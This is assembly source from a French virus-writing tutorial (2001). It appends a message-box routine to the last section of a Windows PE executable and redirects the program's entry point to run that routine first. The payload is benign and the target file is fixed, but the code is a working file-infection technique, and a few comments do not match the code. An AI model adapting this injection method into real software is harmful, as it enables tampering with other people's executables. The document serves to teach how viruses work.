; Ce code source est issu de l'article: Infection, partie 4
; par DoxtorL/[T.I]. Créé en Février 2001.
; Il constitue une démonstration élémentaire de la technologie nécessaire
; à la fabrication de programmes auto-reproducteurs communément appelés
; virus informatiques. Ce programme est étudié pour fonctionner dans un
; environnement Win32.
; Ce programme a été conçu à des fins d'enseignement et ne doit pas être
; utiliser à des fins détournées.


; Ce programme ajoute une routine d'affichage d'un message à un fichier Portable 
; Executable .exe. La taille et le nom du fichier cible sont fixés mais peuvent 
; être modifiés avant compilation.


; AVERTISSEMENT:
; Le fichier après modification n'est exécutable que sur la machine qui
; a servi pour l'opération.
; Ceci est dû au fait que l'adresse de l'API MessageBoxA n'est pas
; recalculé dynamiquement par le programme modifié mais "lu" au moment
; de la modification.

; Aucun test n'est fait sur la présence d'une section complètement
; virtuelle à la fin du fichier cible.
; S'il y'en a une, je crains fort que le fichier ne soit écrasé sans
; autre forme de procès.
; Evidemment comme toujours, il ne peut y'avoir de garantie sur le bon
; fonctionnement du programme cible après modification !



.386p                 

.model flat


.data

; Données nécessaires pour la manipulation de fichier:

HandleFichier        dd 0                       ;
HandleMap            dd 0                       ;
AdresseMap           dd 0                       ;
TailleMap            dd 0                       ;
TailleFichier        dd 4096                    ; Vous pouvez changer ces deux valeurs
NomFichier           db "cible.exe",0           ; pour effectuer vos propres tests.


; Données nécessaires pour l'obtention de l'adresse de l'API MessageBoxA:

User32               db "user32.dll",0          ; nom de la DLL qui exporte l'API
                                                ; MessageBoxA
MsgBox               db "MessageBoxA",0         ; l'API utilisé pour créer la boite
                                                ; de message.

; Données diverses:

NbSect               dw 0                       ; Contiendra le nombre de sections.
ChampRetourAd        dd 0                       ; Contiendra l'adresse  du champ
                                                ; "Point d'entrée" dans l'en-tête
                                                ; optionnel.
.code

DEBUT:                        

    extrn MessageBoxA          :Proc 

; APIs utilisées pour la manipulation de fichiers:

    extrn CreateFileA          :Proc
    extrn CreateFileMappingA   :Proc
    extrn MapViewOfFile        :Proc
    extrn UnmapViewOfFile      :Proc
    extrn CloseHandle          :Proc  
    extrn SetFilePointer       :Proc
    extrn SetEndOfFile         :Proc
    extrn ExitProcess          :Proc


; APIs utilisées pour récupérer l'adresse de l'API MessageBoxA

    extrn GetModuleHandleA     :Proc
    extrn GetProcAddress       :Proc


;********************************************
; On récupère l'adresse de l'API MessageBoxA
;********************************************


    push offset User32
    call GetModuleHandleA                       ; renvoie dans eax l'adresse où a été
                                                ; chargée la DLL User32.dll.

    push offset MsgBox                          ;
    push eax                                    ;
    call GetProcAddress                         ; renvoie dans eax l'adresse de l'API
                                                ; MessageBoxA.
    mov dword ptr [APIad],eax                   ; on sauvegarde l'adresse de l'API.
                                   


;##############################################################################


;****************************************************************
; Ouverture et création de l'image du fichier en cours d'examen :
;****************************************************************


    mov eax,dword ptr [TailleFichier]           ; On met dans eax la taille du fichier.

 
; On s'occupe maintenant de la taille qu'aurra l'image:

    mov dword ptr [TailleMap],eax 
    add dword ptr [TailleMap],200h              ; Pour tenir compte de l'ajout de la routine
                                                ; qui contient la "boite de message".
    call Ouvrir                                 ; On ouvre et mappe le fichier
    mov edx,dword ptr [AdresseMap]              ; On met dans edx l'adresse de début de l'image

;##############################################################################




;**********************************************************************
; On teste si le fichier est bien un fichier Portable Executable .exe :
;**********************************************************************

; On teste les deux premiers octets:

    cmp word ptr [edx],"ZM"                     ; Remarquez que "MZ" est inversée.
    jnz ERROR                                   ; La lecture en mémoire par le micropro-
                                                ; cesseur est faite à l'envers.



; Si l'on est arrivé ici cela veut dire que le fichier est un fichier .exe.
; Mais est-ce bien un P.E .exe?


    cmp dword ptr [edx+3ch],200h                ; On ne sait pas à l'avance que le fichier
                                                ; est un PE exe donc aucune raison, à priori
                                                ; qu'à l'emplacement "edx+3ch" on ait 
                                                ; l'offset de fichier qui indique où trouver
                                                ; l'emplacement du début de l'en-tête PE.
                                                ;
                                                ; 200h c'est 512 en décimal, ce qui signifie
                                                ; que si on est train d'examiner un fichier
                                                ; exe de Msdos qui n'est pas un fichier
                                                ; de Windows et qui a pour taille moins de
                                                ; 512 octets et qui de plus, contient à
                                                ; l'offset 3ch un double mot qui est plus 
                                                ; petit que 200h, mais plus grand que la taille
                                                ; du fichier...on risque le crash avec ce qui
                                                ; suit MAIS HEUREUSEMENT...
                                                ; Cela n'arrive jamais dans la pratique !
    jg ERROR                                    ; L'offset est trop élevé on n'a sans doute
                                                ; pas affaire à un fichier exe de Windows.

    add edx,dword ptr [edx+3ch]                 ; edx contient l'adresse de début de l'en-
                                                ; tête PE présumé.


; On teste la présence de "PE" qui nous garantit que c'est bien un fichier
; P.E .exe:

    cmp word ptr [edx],"EP"                     ; Le test précédemment effectué prend tout
                                                ; son sens ici. Si le fichier est un prog-
                                                ; ramme Msdos l'adresse contenue dans edx
                                                ; risque d'être en dehors de l'espace utili-
                                                ; sé par l'image du fichier en cours 
                                                ; d'examen; cela risque de provoquer une 
                                                ; erreur de lecture de page.
                                                ; Remarquez que "PE" est inversée.
    jnz ERROR                                   ; Le fichier n'est pas un programme PE.



;##############################################################################



;**********************************
; Manipulations sur l'en-tête P.E :
;**********************************


    mov ax,word ptr [edx+06h]                   ; On lit le nombre de sections contenues
                                                ; dans le fichier PE cible.
    mov word ptr [NbSect],ax                    ; On sauvegarde le nombre de sections
                                                ; pour plus tard.
    movzx ecx,word ptr [edx+14h]                ; On met dans ecx la taille de l'en-tête
                                                ; optionnel. Remarquez que l'on utilise 
                                                ; movzx et non pas mov; en effet, on recopie
                                                ; un mot dans un registre qui est prévu pour
                                                ; contenir un double mot.
                                                ; Le mot va être mis dans cx et les 16 bits
                                                ; de poids le plus élevés de cx sont mis à 0.
 

;##############################################################################


    add edx,18h                                 ; edx contient l'adresse de l'en-tête optionnel 
                                                ; qui suit l'en-tête P.E. 18h est la taille de ce dernier.
    mov edi,edx                                 ; On copie le contenu de edx dans edi. Le contenu de edx
                                                ; n'est pas modifié.


;****************************************
; Manipulations sur l'en-tête optionnel :
;****************************************

; On s'occupe du champ POINT D'ENTREE:


    add edi,10h                                 ; edi contient l'ADRESSE DU CHAMP,
                                                ; dans l'image crée du fichier cible,
                                                ; du point d'entrée du programme P.E cible.
                                                ;
                                                ; Elle nous sera utile plus tard lorsque
                                                ; nous voudrons modifier le point d'entrée
                                                ; pour qu'il pointe sur notre routine
                                                ; d'affichage du message.
    mov dword ptr [ChampRetourAd],edi           ; On sauvegarde cette adresse.
    mov eax,dword ptr [edx+10h]                 ; Lecture du point d'entrée.
                                                ; Nous obtenons l'adresse virtuelle relative
                                                ; en mémoire du point d'entrée du programme.
    add eax,dword ptr [edx+1ch]                 ; On ajoute l'adresse où est chargée, en mé-
                                                ; moire, le fichier cible.
    mov dword ptr [RetourAd],eax                ; RetourAd doit contenir l'adresse de retour
                                                ; vers le code du programme cible.
                                                ; Pour que celui-ci soit exécuté il faut que
                                                ; RetourAd contienne bien entendu l'adresse
                                                ; du point d'entrée du programme cible
                                                ; d'avant la modification.


; Mise à jour du champ TAILLE DE L'IMAGE:
; (ce champ contient la taille en octets de l'espace utilisé par
; la totalité du programme après chargement en mémoire vive)

    add dword ptr [edx+38h],1000h               ; On accroit la taille totale du fichier
                                                ; tel qu'il est après chargement en mémoire
                                                ; vive pour tenir compte de l'ajout d'une
                                                ; routine. Voir ci-après.


;##############################################################################


    add edx,ecx                                 ; edx contient l'adresse de l'en-tête de
                                                ; la première section. ecx contient la 
                                                ; taille de l'en-tête dit optionnel.
                                                ; Les en-tête des sections suivent immédiate-
                                                ; ment.

;*********************************************************************
; Nous devons calculer l'adresse de l'en-tête de la dernière section :
;*********************************************************************


    xor eax,eax                                 ; Astuce standard pour mettre à 0 eax.
    mov cx,word ptr [NbSect]                    ; On récupère le nombre de sections.
                                                ; En fait puisqu'un fichier avec plus de 
                                                ; 256 sections ne se trouve jamais en pra- 
                                                ; tique, ch est nul et cl contient le nombre
                                                ; de sections.(ch contient les bits de poids
                                                ; élevé et cl ceux de poids faible)
    dec cx                                      ; On s'intéresse au début de l'en-tête
                                                ; de la dernière section, pas de sa fin. 
    mov al,28h                                  ; al contient la taille d'une section.
    mul cl                                      ; On multiplie le contenu de al par le
                                                ; contenu de cl. Le résultat est placé dans
                                                ; ax.
    add edx,eax                                 ; On obtient l'adresse de l'en-tête de
                                                ; la dernière section.

;##############################################################################



;****************************************************
; Manipulation sur l'en-tête de la dernière section :
;****************************************************


    add dword ptr [edx+08h],1000h               ; On met à jour la taille de la section
                                                ; qu'elle aurra en mémoire vive.
                                                ; On pourra s'étonner de la valeur
                                                ; énorme 1000h. En général les tailles
                                                ; des sections  sont multiple de 1000h.
                                                ; Pour être rigoureux, on devrait aller
                                                ; lire la valeur dont toutes les tailles
                                                ; des sections en mémoire vive sont
                                                ; multiple dans l'en-tête optionnel.
                                                ; En pratique 1000h est la valeur qui
                                                ; est le plus souvent utilisée. 
    mov ebx,dword ptr [edx+10h]                 ; On sauvegarde la taille sur disque
                                                ; de la dernière section pour l'utiliser
                                                ; plus tard, avant toute modification.
    add dword ptr [edx+10h],200h                ; On met à jour la taille de la section
                                                ; telle qu'elle est sur disque.
                                                ; De la même façon que pour la taille en
                                                ; mémoire vive, la taille sur disque doit 
                                                ; être multiple d'un nombre précisé dans 
                                                ; l'en-tête optionnel. 
                                                ; En pratique cette valeur est 200h.
                                                ; Windows9x n'est pas trop exigent
                                                ; sur l'exactitude de tout ces champs
                                                ; taille. Win NT est beaucoup plus regar-
                                                ; dant.
              

; On va ajouter du code à la fin de la dernière section qui sera exécuté
; dans l'espace mémoire que va réserver Windows pour cette section.
; Nous devons modifier les attributs de cette section pour que windows
; autorise l'exécution de code sans nous gratifier d'une erreur de page.
; Nous devons ajouter l'attribut "Code":


    or dword ptr [edx+24h],80000000h            ; Attribut ECRITURE ajouté.

;##############################################################################


; Pour que le code qui sera ajouté soit exécuté nous allons modifier le 
; point d'entrée du programme cible pour que l'exécution débute par
; notre routine d'affichage d'un message.
 
;***********************************
; Calcul du nouveau point d'entrée :
;***********************************

    mov eax,dword ptr [edx+0ch]                 ; On met dans eax l'adresse virtuelle
                                                ; relative de début de la dernière section.
    add eax,ebx                                 ; On ajoute la taille occupée par cette
                                                ; section sur le disque telle qu'elle était
                                                ; avant modification du fichier.

; eax contient désormais l'adresse virtuelle relative du nouveau point d'entrée.


; Il nous reste à changer le point d'entrée du programme effectivement:


    mov esi,dword ptr [ChampRetourAd]           ; On met dans esi l'adresse, où se trouve
                                                ; le champ qui est renseigné avec l'adresse
                                                ; virtuelle relative du point d'entrée
                                                ; du programme cible.
    mov dword ptr [esi],eax                     ; On renseigne le champ avec le nouveau
                                                ; point d'entrée.


;##############################################################################



    mov edi,dword ptr [AdresseMap]              ; Nous avons besoin à nouveau de connaitre
                                                ; l'adresse de début en mémoire de l'image
                                                ; du fichier cible que nous avons crée.
    add edi,dword ptr [edx+14h]                 ; On ajoute l'offset de fichier qui indique
                                                ; où trouver dans le fichier sur le disque
                                                ; la dernière section.
    add edi,ebx                                 ; On ajoute la taille de la dernière section
                                                ; telle qu'elle était sur le disque
                                                ; avant modification.


;************************************************************************
; il nous reste plus qu'à recopier dans le programme cible notre routine
; d'affichage :
;************************************************************************


    mov ecx,Fin_Message-Message                 ; On met dans ecx le nombre d'octets
                                                ; à copier.
    lea esi,Message                             ; esi contient l'adresse SOURCE de ce qui doit
                                                ; être copié.

; edi contient déja l'adresse de DESTINATION pour le code à copier (lire plus
; haut) 

    repne movsb                                 ; On copie un octet à la fois.

;##############################################################################


;*************************************************************************
; C'est presque fini, il ne reste qu'à rendre effectif les modifications
; effectuée sur l'image crée du fichier cible :
;*************************************************************************

    call Fermer                                 ; le fichier est maintenant modifié et
                                                ; refermé.                               
    call ExitProcess                            ; Le programme va se terminer. 



;##############################################################################



;*********************************************************************
; Le fichier en cours d'examen n'est très certainement pas un fichier
; P.E exe. Nous ne voulons pas le modifier :
;*********************************************************************

ERROR:

    sub dword ptr [TailleMap],200h              ; le fichier n'est pas un PE exe. Pour ne
                                                ; pas accroitre inutilement sa taille 
                                                ; on soustrait ce que l'on avait précédemment
                                                ; ajouté.

    call Fermer                                 ; On referme sans modifier.

    call ExitProcess                            ; On demande la fin du programme.

;##############################################################################


;****************************************************************************
; Ce qui suit est la routine qui sera ajoutée au fichier cible pour créer la
; routine d'affichage d'un message.
;****************************************************************************


Message:

    call ICI                                    ; calcul du "delta offset".
                                                ; la routine complète sera relogée c'est à dire
ICI:                                            ; que toutes les adresses absolues ne seront plus 
                                                ; valables. Pour parer à ce problème on va calculer
                                                ; et mettre dans ebp la distance entre l'emplacement
                                                ; après relocation du label "ICI:" et de son emplace-
                                                ; ment avant relocation. Par exemple, dans le programme
                                                ; ici présenté, ebp va contenir 0.
    pop ebp                                     ; ebp contient l'adresse du label "ICI:"
                                                ; cette adresse est dépendante du programme ou sera
                                                ; insérer cette routine d'affichage d'un message.
    sub ebp,offset ICI                          ; Cela permet de tenir compte du fait que cette routine
                                                ; d'affichage à une adresse qui est variable suivant
                                                ; le programme qui a été choisi pour l'acceuillir.
    push 0                                      ;
    lea eax,Titre+ebp                           ; mettre dans eax l'adresse de la chaine de caractères
                                                ; qui contient le titre.
                                                ; ebp permet de tenir compte de la relocation.
    push eax                                    ; passage de la valeur par la pile
    lea eax,Msg+ebp                             ; c'est au tour du message lui-même
    push eax                                    ; passage par la pile
    push 0                                      ;
    lea eax,APIad+ebp                           ; on met dans eax l'adresse de l'endroit où l'on a mis
                                                ; l'adresse de l'API MessageBoxA. 
    call dword ptr [eax];                       ; appel de l'API MessageBoxA. 
    mov eax,dword ptr [RetourAd+ebp]            ; on récupère l'adresse du début du programme
                                                ; avant modification.
    jmp eax                                     ; et on s'y rend. 



; Données utilisées par la routine qui affiche le message, elles seront
; transférées elles aussi dans le fichier que l'on veut modifier:

Titre    db "ALERTE",0                          ;
Msg      db "Le fichier a bien été modifié !",0 ;
APIad    dd 0                                   ; emplacement pour mettre l'adresse de 
                                                ; l'API MessageBoxA
RetourAd dd 0                                   ; le point d'entrée du programme avant modification

                        
Fin_Message:                                    ; fin de la routine qui affiche le message


;##############################################################################



;****************************************************************************
; Ce qui suit sont les fonctions utilisées pour la manipulation de fichiers :
;****************************************************************************


Ouvrir:


; ouverture du fichier:

    pushad                                      ; sauvegarde des registres 

    push 0                                      ;
    push 0                                      ;
    push 3                                      ;
    push 0                                      ;
    push 1                                      ;
    push 80000000h or 40000000h                 ;
    lea eax,NomFichier                          ;
    push eax                                    ;
    call CreateFileA                            ;

    mov dword ptr [HandleFichier],eax           ; on sauvegarde le handle du fichier

; prépare le mapping:

    push 0                                      ;
    push dword ptr [TailleMap]                  ;
    push 0                                      ;
    push 4                                      ;
    push 0                                      ;
    push dword ptr [HandleFichier]              ;
    call CreateFileMappingA                     ;

    mov dword ptr [HandleMap],eax               ; on sauvegarde ce handle

; le fichier est mappé:

    push dword ptr [TailleMap]                  ;
    push 0                                      ;
    push 0                                      ;
    push 2                                      ;
    push dword ptr [HandleMap]                  ;
    call MapViewOfFile                          ;

    mov dword ptr [AdresseMap],eax              ; on sauvegarde l'adresse de début de l'image
                                                ; crée en mémoire  
    popad                                       ; restauration des registres
    ret                                         ; retour au programme principal


Fermer:

    pushad

; l'image crée en mémoire est supprimée et le fichier va prendre en compte
; les modifications apportées.

    push dword ptr [AdresseMap]                 ;
    call UnmapViewOfFile                        ;

    push dword ptr [HandleMap]                  ;
    call CloseHandle                            ;

; on retaille le fichier si nécessaire:

    push 0                                      ;
    push 0                                      ;
    push dword ptr [TailleMap]                  ;
    push dword ptr [HandleFichier]              ;
    call SetFilePointer                         ;

    push dword ptr [HandleFichier]              ;
    call SetEndOfFile                           ;

; on referme le fichier:

    push dword ptr [HandleFichier]              ;
    call CloseHandle                            ;

    popad                                       ;
    ret                                         ; retour au programme principal


;##############################################################################


end DEBUT                                       ; fin du programme